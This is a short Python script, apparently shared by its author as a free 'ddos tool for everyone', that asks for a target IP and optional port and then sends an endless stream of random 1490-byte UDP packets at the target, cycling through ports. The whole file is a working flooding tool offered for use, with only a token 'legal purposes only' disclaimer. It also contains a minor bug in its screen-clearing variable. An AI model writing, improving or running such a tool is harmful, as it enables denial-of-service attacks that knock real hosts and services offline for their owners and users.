#Only for legal purposes only!!!
#Basic fast fun ddos tool for everyone
#Discord Caiser#4435

from ast import For, Return
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
from colorama import *
import ctypes


uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


import requests
import re

while True:
    print("1. IP Address")
    print("2. Exit")

    opt = str(input("\n>"))

    if opt == '1':
        ip = str(input("IP Address: "))
        break

    elif opt == '2':
        exit()

    else:
        time.sleep(2)
        os.system(cmd_clear)


port_mode = False 
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break
    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

sent = 0

if port_mode == False:
    try:
        while True:
            if port == 65534:
                port = 2

            elif port == 1900:
                port = 1901

            elif port == 80:
                port = 80

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port,))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True:
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 2

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))     
    except:
        print('\n\033[31;1mExited\033[0m')
